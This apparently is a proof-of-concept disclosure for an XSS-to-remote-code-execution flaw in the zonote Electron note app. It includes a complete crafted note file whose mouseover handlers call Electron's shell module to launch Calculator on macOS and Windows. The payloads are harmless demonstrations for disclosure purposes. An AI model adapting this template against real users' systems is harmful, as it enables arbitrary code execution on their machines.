[zonote](https://github.com/zonetti/zonote) allows XSS via crafted note, with resultant Remote Code Execution (because Node.js integration is enabled).

## Steps to exploit the vulnerability

1. Download any zonote [affected version](https://github.com/zonetti/zonote/releases/tag/v0.4.0)
2. Open zonote app
3. Import xss-rce.znt in zonote via Menu > Open
4. Hover over the different links in imported notes

```
xss-rce.znt
znt-note|0,15,264,213,200,0
<a onmouseover="try{ const {shell} = require('electron'); console.log({shell}); shell.openPath('/System/Applications/Calculator.app')}catch(e){alert(e)}">Remote Code Execution - Open MacOS Calculator</a>

znt-note|0,315,266,215,200,0
<a onmouseover="try{ const {shell} = require('electron'); shell.openExternal('file:C:/Windows/System32/calc.exe') }catch(e){alert(e)}">Remote Code Execution - Open Windows Calculator</a>

znt-note|0,12,1,200,200,0
<a onmouseover="alert('XSS!')">Hover to show XSS</a>

znt-note|0,324,2,200,200,0
<a onmouseover="try{ const {shell} = require('electron'); console.log({shell}); shell.beep()}catch(e){alert(e)}">Hover to show access to Electron shell module by playing a beep sound</a>
```
